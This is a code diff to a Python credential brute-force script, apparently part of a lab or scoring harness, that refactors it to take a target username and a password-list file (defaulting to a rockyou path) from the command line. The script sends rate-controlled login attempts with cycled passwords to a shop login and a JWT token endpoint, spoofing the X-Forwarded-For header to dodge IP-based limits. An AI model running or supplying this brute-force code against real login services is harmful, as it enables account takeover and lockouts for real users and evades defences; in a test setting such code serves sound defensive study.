@@ -33,11 +33,9 @@ def load_creds(
     return passwords
 
 
-passwords = load_creds(limit=5000)
-pool = itertools.cycle(passwords)
-
-
 def attack(
+    username: str,
+    pool: itertools.cycle,
     rate_per_sec=10,
     attempts=50,
     use_jwt=False,
@@ -97,15 +95,13 @@ def attack(
         for i in range(1, attempts + 1):
             attempted = i
             pwd = next(pool)
-            ip = "10.0.0.1"
-            user = "alice"
 
             token = None
             try:
                 if use_jwt:
                     login_resp = session.post(
                         f"{score_base}/api/token",
-                        data={"username": user, "password": pwd},
+                        data={"username": username, "password": pwd},
                         timeout=3,
                     )
                     login_ok = login_resp.status_code == 200
@@ -119,8 +115,8 @@ def attack(
                 else:
                     login_resp = session.post(
                         f"{shop_url}/login",
-                        json={"username": user, "password": pwd},
-                        headers={"X-Forwarded-For": ip},
+                        json={"username": username, "password": pwd},
+                        headers={"X-Forwarded-For": "10.0.0.1"},
                         timeout=3,
                     )
                     login_ok = login_resp.status_code == 200
@@ -129,7 +125,7 @@ def attack(
                 login_ok = False
 
             score_payload = {
-                "client_ip": ip,
+                "client_ip": "10.0.0.1",
                 "auth_result": "success" if login_ok else "failure",
                 "with_jwt": use_jwt,
             }
@@ -199,6 +195,12 @@ def attack(
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser()
+    parser.add_argument(
+        "--username", default="alice", help="Target username for the attack."
+    )
+    parser.add_argument(
+        "--passwords-file", default=ROCKYOU_PATH, help="Path to the password file."
+    )
     parser.add_argument("--jwt", action="store_true", help="Use JWT login endpoint")
     parser.add_argument("--rate", type=float, default=5, help="Attempts per second")
     parser.add_argument("--attempts", type=int, default=50, help="Number of attempts to send")
@@ -215,7 +217,13 @@ if __name__ == "__main__":
         help="Endpoint to fetch rotating chain value",
     )
     args = parser.parse_args()
+
+    passwords = load_creds(path=args.passwords_file, limit=5000)
+    pool = itertools.cycle(passwords)
+
     attack(
+        username=args.username,
+        pool=pool,
         rate_per_sec=args.rate,
         attempts=args.attempts,
         use_jwt=args.jwt,
